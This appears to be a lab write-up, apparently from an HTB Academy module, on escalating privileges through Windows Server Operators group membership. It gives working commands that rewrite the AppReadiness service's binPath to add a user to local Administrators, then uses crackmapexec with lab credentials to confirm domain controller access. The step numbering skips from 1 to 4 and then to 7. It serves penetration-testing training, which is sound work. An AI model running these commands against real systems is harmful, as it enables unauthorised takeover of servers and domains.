## Overview

The  [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) group is a highly privileged Windows group that allows members to administer Windows servers without requiring Domain Admin privileges. However, membership in this group grants dangerous privileges that can lead to complete system compromise.

### Key Characteristics
- Can log in locally to servers, including Domain Controllers
- Confers `SeBackupPrivilege` and `SeRestorePrivilege` privileges
- Can control and manage local services
- Members can manipulate service binaries and configurations
- Very high privilege escalation potential

---

## Privilege Analysis

### Dangerous Privileges
1. **SeBackupPrivilege**: Allows bypassing file and registry permissions during backup
2. **SeRestorePrivilege**: Allows restoring files with elevated privileges
3. **Service Control**: Ability to start, stop, and modify services running as SYSTEM

### Exploitation Vector
Service manipulation is the primary exploitation method:
- Change service binary paths
- Execute arbitrary commands with SYSTEM privileges
- Bypass UAC and privilege escalation checks

## Practical Exploitation: AppReadiness Service

### Step 1: Query Service Configuration

**Command:**
```cmd
C:\htb> sc qc AppReadiness
```

**Output:**
```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :

        SERVICE_START_NAME : LocalSystem
```

**Analysis:**
- Service runs as `LocalSystem` (highest privilege on Windows)
- Type: `WIN32_SHARE_PROCESS`
- Start Type: `DEMAND_START` (starts on demand)

### Step 4: Modify Service Binary Path

**Strategy:** Change the service binary path to execute a command that adds `server_adm` to local administrators

**Command:**
```cmd
C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

**Output:**
```
[SC] ChangeServiceConfig SUCCESS
```

**Explanation:**
- `sc config`: Modifies service configuration
- `AppReadiness`: Target service name
- `binPath=`: New binary path parameter
- `cmd /c net localgroup Administrators server_adm /add`: Command to execute
  - `/c`: Execute command and terminate
  - `net localgroup`: Local group management
  - `Administrators`: Target group
  - `server_adm /add`: Add user to group

---

### Step 5: Start the Service

**Command:**
```cmd
C:\htb> sc start AppReadiness
```

**Output:**
```
[SC] StartService FAILED 1053: The service did not respond to the start or control request in a timely fashion.
```

**Expected Behavior:**
- Failure is expected because `cmd /c` terminates after execution
- The command still executes successfully
- Service fails because the expected service doesn't run

## Post-Exploitation: Domain Controller Access

### Step 7: Confirm Admin Access on Domain Controller

**Command:**
```bash
s0nam@htb[/htb]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
```

**Output:**
```
SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
```

**Analysis:**
- Successfully authenticated to Domain Controller (WINLPE-DC01)
- Domain: `INLANEFREIGHT.LOCAL`
- Status: `(Pwn3d!)` - Indicates domain compromise
- Full administrative access achieved
